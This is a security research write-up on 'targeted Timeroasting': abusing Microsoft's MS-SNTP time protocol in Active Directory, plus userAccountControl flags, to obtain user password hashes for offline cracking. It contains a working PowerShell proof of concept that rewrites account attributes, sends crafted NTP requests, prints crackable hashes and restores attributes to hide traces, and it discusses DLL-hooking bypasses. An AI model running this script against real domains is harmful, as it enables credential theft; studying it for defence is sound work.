# Targeted Timeroasting: Weaponizing Users and Computers with Controlled UAC Flags (Pt. 1)

Do you know **NTP**, or its Microsoft Windows variant, **MS-SNTP**? Well, I racked my brain trying to figure out what it was, and I found it really interesting. In this article, we will focus exclusively on the **MS-SNTP** protocol. We will explore how this protocol could potentially be exploited to steal authentication or identification credentials. 

First, we will examine how the **MS-SNTP** protocol works and how it is used within **Active Directory** infrastructures. We will also highlight its importance in such environments. Next, we will explore how the **MS-SNTP** protocol can be abused by proposing a variation of an existing attack. We will develop a proof-of-concept exploit (`PoC`) during this article for example.

## What is the MS-SNTP protocol, and how does it work?

"*The **Simple Network Time Protocol** (abbreviated as **SNTP**) is a protocol from the Internet protocol suite used for synchronizing system clocks across networks. The current version, **SNTPv4**, supports both **IPv4** and **IPv6** networks and is described in [RFC 4330](https://datatracker.ietf.org/doc/html/rfc4330).*"

Its main purpose is to maintain accurate time synchronization across networked devices, ensuring consistent timestamps and coordinated operations. In **Active Directory** infrastructures, its use is similar: it ensures time synchronization across all computers within a Windows domain. This synchronization is especially important for **Kerberos authentication**, which, during the **pre-authentication** phase, checks the timestamp provided by the client machine. 

![image](https://github.com/user-attachments/assets/3d5e8fe6-477b-45a6-be24-be886235781e)

If there is a time difference greater than 5 minutes between the client and the **domain controller**, Kerberos pre-authentication fails. **MS-SNTP** ensures that all systems within an **Active Directory** domain are synchronized to a reliable time source. On each **Windows** machine within an **Active Directory** domain, time synchronization is generally handled by the `svchost.exe` service. 

It loads its configuration from the registry key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time`, then determines its time service role based on the machine’s context, whether it is a **Domain Controller (DC)**, a **PDC Emulator**, a regular **domain member**, or a **workgroup** computer. Next, the system determines its time source. Each host queries both the registry and the **Active Directory** environment to figure out from whom it should synchronize time.

For example:

> * If the machine is a **domain-joined client**, it uses the closest **Domain Controller (DC)**, determined via **DNS** and the **DC Locator** mechanism.
> * If it's a **non-PDC Domain Controller**, it is configured to synchronize with the **PDC Emulator** of its domain.
> * If it's the **PDC Emulator**, and specifically the one for the **forest root domain**, it typically uses the `ManualPeerList`, often configured with external public **NTP servers**, as its time source.

So, before talking about **"Targeted Timeroasting"**, I’m going to explain what **Timeroasting** is in the first place. To do this, I set up a very simple lab with a basic Windows Server 2022 promoted as a **Primary Domain Controller (PDC)**. Domain-joined machines obtain time synchronization via NTP from a domain controller. 

A Microsoft extension (MS-SNTP) adds a MAC authenticator calculated from the hash of a computer account, along with a **Relative Identifier (RID)** in the request. So, an attacker can send NTP requests specifying RIDs linked to machine accounts and receive hashes in response, which can then be cracked offline. 

![image](https://github.com/user-attachments/assets/db0f9e09-0b7c-493b-bdcb-e5b972325ef1)

The goal would be to send a time synchronization request to the Domain Controller, including the RID of the targeted machine account. The Domain Controller will then generate the MAC based on the provided RID, therefore using the **targeted machine account**.

![image](https://github.com/user-attachments/assets/98fe2782-8fa3-4220-974a-09df869e637e)

Above, you can see a **Wireshark** capture showing the process, along with a **failure**, of a time synchronization request using the **`NTP`** protocol (**`MS-SNTP`**). You can observe that in the response sent by the **NTP server** (**the DC in our case**), the **MAC** is indeed present. Why didn’t the first attempt work? Because it couldn’t generate a **MAC**, since we had deliberately provided an incorrect **`RID`** for testing purposes.

> Info: The **MAC** (Message Authentication Code) is a cryptographic signature added to the **`NTP`** response to ensure the **integrity** of the **NTP message** and the **authenticity** of the sender (the **Domain Controller**).

## UAC Flags?

**`UAC`** (for **`UserAccountControl`**) is an integer attribute on **user** and **computer** objects in **Active Directory (AD)** that represents a set of **bitwise flags**. Each bit defines a specific **property** or **behavior** of the account, such as whether the account is **disabled**, **locked out**, a **machine account**, **password never expires**, and so on. Based on the [Microsoft documentation](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties), several **flags** are defined under **`UserAccountControl`**, such as:

* `INTERDOMAIN_TRUST_ACCOUNT`
* `WORKSTATION_TRUST_ACCOUNT`
* `SERVER_TRUST_ACCOUNT`
* `DONT_EXPIRE_PASSWORD`
* and others...

Each **flag** corresponds to a specific **bit position** in this integer. This means we use numbers to combine multiple states into a single value.
For example: **`66048`** in decimal, **`0x10200`** in hexadecimal, and **`0001 0000 0010 0000 0000`** in binary.

This system is tied to how computers represent **bits**, and how we, as humans, read and interpret them.
Each flag is a **power of 2**, representing a specific bit, making it easy to toggle individual settings using **bitwise operations**.

So, to assign multiple **flags** to the same object, you simply add their **decimal values** together.
For example, to set both **`WORKSTATION_TRUST_ACCOUNT`** (`4096` / `0x1000`) and **`DONT_EXPIRE_PASSWORD`** (`65536` / `0x10000`), you add:

`4096 + 65536 = 69632`

That resulting decimal value, **`69632`**, is what you assign to the **`UserAccountControl`** attribute.

Coming back to our main objective, targeting not **computer accounts**, but **user accounts**. The idea we had (inspired by an **excellent article** I highly recommend, I’ll share it at the end) was the following:

If we could make a **user account appear as a machine account** to the **Domain Controller**, then the DC would behave as usual. It would generate the **MAC** using the supplied credentials, and the **hash** used for that MAC would actually be the hash of the **targeted user**.

![image](https://github.com/user-attachments/assets/2c5f71c7-75e6-43c3-b929-fb374ef0dc62)

That’s when the idea came to us: understanding **how the Domain Controller verifies** the validity and **type of object** it’s dealing with. This led us to take a closer look at the available `UserAccountControl` (UAC) flags, and how they influence the DC’s behavior. It doesn’t just rely on how the object *looks* (like having a `$` at the end). It checks key attributes stored in Active Directory to determine whether the object is a **user**, a **machine**, or even a **domain controller**.

The most critical attribute here is `userAccountControl`. This integer contains a combination of **bitwise flags**, and one of those flags explicitly tells the DC: *"this is a workstation trust account"*, or *"this is a standard user"*. Other attributes like `objectClass` or `objectCategory` help categorize the object, but **behavioral logic**, such as how MS-SNTP treats it, is ultimately driven by these flags.

Here’s a quick summary:

| Attribute            | Purpose                                     | Example value                        |
| -------------------- | ------------------------------------------- | ------------------------------------ |
| `objectClass`        | General category (`user`, `computer`, ...)  | `user`                             |
| `objectCategory`     | Schema-based classification                 | `CN=Person,...` or `CN=Computer,...` |
| `userAccountControl` | **Determines behavior and type** via flags  | `0x0200` = user, `0x1000` = machine  |
| `sAMAccountName`     | Login name (trailing `$` is cosmetic only)  | `alice$`, `PC01$`                    |

So, as you may have guessed, the goal is to **target a user account** by modifying some of its attributes, specifically the `UserAccountControl`, to make it appear as a **machine account**. This way, the **Domain Controller** will generate a **MAC** in its response based on the **user’s secrets**, just as it would for a legitimate machine account. To achieve this, and to automate the process, we wrote a **PowerShell script** that:

* Adds the appropriate **`UserAccountControl`** flag (`WORKSTATION_TRUST_ACCOUNT` = 4096) to the targeted user account.
* Sends the crafted **NTP request** to the Domain Controller.
* Formats the response data properly for **offline cracking**.
* Then restores the original attribute values for better **OPSEC**.

We based our work on the script from the article I mentioned earlier.
Here’s the code:

```powershell
param(
    [Parameter(Mandatory=$true)][Alias("dc")][string]$a,
    [Alias("target")][string]$b,
    [Alias("targets")][string]$c
)

Import-Module ActiveDirectory
$d=4096
$e=@()
if (!$b -and !$c){Write-Host "[!] Use -target or -targets." -ForegroundColor Red;Exit}
if ($b -and $c){Write-Host "[!] Use only -target or -targets, not both." -ForegroundColor Red;Exit}
$e=if ($b){@($b)}else{Get-Content $c}
$f=[byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)
$g=New-Object System.Net.Sockets.UdpClient
$g.Client.ReceiveTimeout=6
$g.Connect($a,123)

foreach ($h in $e){
    try{$i=Get-ADUser -Identity $h -Properties DistinguishedName,UserAccountControl}catch{continue}
    $j=(New-Object System.Security.Principal.NTAccount($h)).Translate([System.Security.Principal.SecurityIdentifier])
    $k=($j.Value -split '-')[ -1 ]
    $l=$i.UserAccountControl
    $m=$i.DistinguishedName
    $n=if ($h[-1] -ne "$"){$h+"$"}else{$h}
    Set-ADUser -Identity $m -Replace @{userAccountControl=$d;samAccountName=$n}
    $o=$f+[BitConverter]::GetBytes([int]$k)+[byte[]]::new(16)
    try{
        [void]$g.Send($o,$o.Length)
        $p=$g.Receive([ref]$null)
        if ($p.Length -eq 68){
            $q=[byte[]]$p[0..47]
            $r=[byte[]]$p[-16..-1]
            $s=[BitConverter]::ToString($q).Replace("-","").ToLower()
            $t=[BitConverter]::ToString($r).Replace("-","").ToLower()
            Write-Host ("{0}:`$sntp-ms`{1}`${2}" -f $k,$t,$s) -ForegroundColor Green
        }
    }catch{}
    Set-ADUser -Identity $m -Replace @{samAccountName=$h;userAccountControl=$l}
}
$g.Close()
```

## The problems come faster than you'd like to believe...

Great, for the sake of experimentation, we decided to target a test account created specifically for this purpose, named `j.doe` (John Doe). We ran the script, pointed it at the **Domain Controller** and the **target account**. Below is the screenshot of the script's execution, and as you can see, the result is quite telling.

![image](https://github.com/user-attachments/assets/761101e4-e5f5-4864-948a-b5c22d4692b8)

However, what you're seeing here is, unfortunately, just an illusion. If you look closely, you’ll notice that I’m currently running the session as **Administrator**. That means I’m a member of both the **Domain Admins** and **Enterprise Admins** groups at the time of executing this command. And unfortunately, those are **critical requirements** for this attack to work successfully.

Now we arrive at what I find to be the **most fascinating part** of the article: 

We’re about to dive deep into the internals of **Microsoft Windows** and uncover **why elevated privileges are currently required** to perform this attack. At first, we tried running the script using a **standard domain account**, no special permissions, no admin rights, and no delegation over the targeted account. As expected, it **didn’t work**: modifying that kind of attribute requires at least some permissions on the object.

So, we thought: what if we had **Full Control**, or permissions like **`WriteDACL`**, or even **`GenericAll`** over the user object? Could we then edit `userAccountControl` for the **WORKSTATION_TRUST_ACCOUNT** flag?

![image](https://github.com/user-attachments/assets/5ddde107-f38b-4a92-bd8c-83d27d4ad2e2)

Well... **nope**.

That’s when things started getting interesting, and a bit frustrating. It marked the beginning of a **deep-dive investigation** into **why** this was happening. Indeed, after initially checking the **DACLs** (Discretionary Access Control Lists) of the object we wanted to compromise, we noticed that **domain groups** like **Domain Admins**, **Enterprise Admins**, and even **Account Operators** had **Full Control** over the object. That led us to believe this was the right direction to investigate, that perhaps it was simply a matter of having the proper ACLs.

![image](https://github.com/user-attachments/assets/d443c1b7-2ebb-43d3-b8b7-8cf24f21e17f)

But we were still far from the full picture. After some research, we came across a few articles suggesting that access to certain attributes is, primarily for **security reasons**, handled **internally** by **Domain Controllers**, rather than being fully governed by DACLs. That’s when we decided to shift our investigation in that direction.

We discovered the existence of a DLL we hadn’t encountered before: **`ntdsai.dll`**.

This module is part of the **NTDS (NT Directory Services)** subsystem and is responsible for a large portion of the **internal logic and functionality** that powers **Active Directory**.

Here's what makes `ntdsai.dll` so crucial:

* It handles communication with the **Active Directory database** (`NTDS.DIT`), controlling how data is **read, written, and queried**.
* It enforces **directory schema rules**, **security descriptors**, and **object relationships**, making it a core component of any Domain Controller’s behavior.
* It plays a **central role in replication**, implementing the logic behind **multi-master replication** to ensure consistency across domain controllers.
* It supports **internal operations** like **LDAP query handling**, **authentication**, **directory updates**, and **transaction integrity**.
* It enforces **referential integrity** between directory objects and manages **replication metadata**.

After discovering it, we began creating a non-exhaustive map of the internal checks that the Domain Controller performs, or at least approximations of them, based on our observations and research.

![image](https://github.com/user-attachments/assets/2185a1ed-eead-4fc0-b9ff-6fe7eaf93667)

The process begins when a client, such as `powershell.exe`, initiates a change to Active Directory using a .NET API. This call is wrapped by a .NET/LDAP layer that formats the request into a proper LDAP `ModifyRequest` and sends it to `lsass.exe`, the Local Security Authority Subsystem Service, which hosts the Active Directory Domain Services (NTDS).

Once received, `lsass.exe` invokes ACL validation to ensure that the caller has the proper permissions to perform the requested operation. This is done by checking the DACL (Discretionary Access Control List) within the object’s security descriptor. If access is allowed, the system proceeds with further processing.

The request then flows through the schema validation stage. Here, the system performs a lookup against the AD schema to verify that the operation aligns with defined constraints, such as `objectClass`, `syntaxID`, and attribute rules. This ensures structural and syntactical integrity.

Following schema validation, the operation is passed to `ntdsai.dll`, which contains the core business logic of Active Directory. This DLL enforces hardcoded validation rules, including attribute cross-checks. For example, if the `objectClass` is `"user"` and the `userAccountControl` (`uac`) attribute is set to `4096`, the operation will be rejected. This ensures internal consistency and prevents invalid object states.

Finally, the result, either success or failure, is returned to the client in a structured response. **After understanding this**, we then tried to **identify possible bypass techniques** that could be available to us, in order to later attempt to **circumvent the restrictions** applied to the `userAccountControl` attribute:

![image](https://github.com/user-attachments/assets/58d65da2-c61d-4c96-8e99-b72613b9ce21)

**The initial bypass techniques are more or less feasible depending on the situation.** What I’d like to discuss with you now is the idea of **hooking the DLL directly**. However, in order to do that, we’ll first need to **identify the exact function we want to target**. **Let’s dive into the world of reverse engineering.** **The first thing to do is identify where the DLL is located on the domain controller.** An important and interesting point to note is that **this DLL is only present on domain controllers**. The DLL is located at `C:\Windows\System32\ntdsai.dll`. 

![image](https://github.com/user-attachments/assets/87f31514-a32a-4af2-90be-57b476b4338b)

**Ultimately, after some analysis, we realized we won’t be able to go much further.** **The prerequisites are far too heavy and complex** for such a simple attack.

![image](https://github.com/user-attachments/assets/0e5e5858-7c92-4850-a80d-cf18194e8b55)

After importing the DLL into `Binary Ninja`, I identified one of the functions causing issues, located in `samsrv.dll`. **Unfortunately, analyzing everything in depth would take too much time**, so I’ll save that for a potential future article. **Additionally**, DLL hooking generally requires having **local administrator privileges** on the machine, which means being **local admin on the domain controller**...

## Conclusion

**In conclusion**, carrying out this attack requires being a principal with a level of permissions that is currently far too high to be practical, so it’s not particularly viable at this stage. **However**, I hope you’ve learned something throughout this article. Just so you know, I’m not ruling out the possibility of a part 2 to this article, so stay tuned.

**Wishing you nothing but the best, see you in the next write-up!**

## Sources

https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac
https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties
https://github.com/SecuraBV/Timeroast
https://cybersecurity.bureauveritas.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf
